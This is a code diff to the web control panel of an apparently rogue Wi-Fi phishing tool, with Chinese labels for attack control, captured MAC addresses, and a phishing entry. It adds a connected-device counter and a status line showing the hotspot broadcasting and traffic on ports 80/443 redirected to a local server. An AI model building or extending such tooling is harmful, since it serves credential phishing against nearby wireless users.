@@ -122,7 +122,7 @@
             </div>
 
             <!-- ========== 攻击控制 ========== -->
-            <div class="card">
+            <div class="card" style="grid-row: span 2;">
                 <h2> 攻击控制</h2>
                 <div id="status_indicator">
                     <span class="status status-stopped" id="status_light"></span>
@@ -141,7 +141,12 @@
                         <div class="stat-number" id="mac_count">{{ mac_count }}</div>
                         <div class="stat-label">捕获MAC</div>
                     </div>
+                    <div>
+                        <div class="stat-number" id="client_count">0</div>
+                        <div class="stat-label">已连接设备</div>
+                    </div>
                 </div>
+                <div id="attack_detail" style="margin-top:10px;font-size:12px;color:#888;display:none;"></div>
             </div>
 
             <!-- ========== 钓鱼入口 ========== -->
@@ -463,9 +468,17 @@
             var data = await response.json();
             var light = document.getElementById('status_light');
             var text = document.getElementById('status_text');
+            var detail = document.getElementById('attack_detail');
             if (data.hostapd) {
                 light.className = 'status status-running';
                 text.innerText = '运行中';
+                detail.style.display = 'block';
+                try {
+                    var cr = await fetch('/api/clients');
+                    var cd = await cr.json();
+                    document.getElementById('client_count').innerText = cd.count || 0;
+                    detail.innerHTML = '热点广播中 | 已连接: ' + (cd.count||0) + ' 个设备 | 端口转发: 80/443→5000';
+                } catch(e) { detail.innerHTML = '热点广播中'; }
                 wasRunning = true;
             } else {
                 light.className = 'status status-stopped';
@@ -476,6 +489,8 @@
                         try { await fetch('/api/start', { method: 'POST' }); } catch(e) {}
                     }, 5000);
                 }
+                detail.style.display = 'none';
+                document.getElementById('client_count').innerText = '0';
             }
         }
 
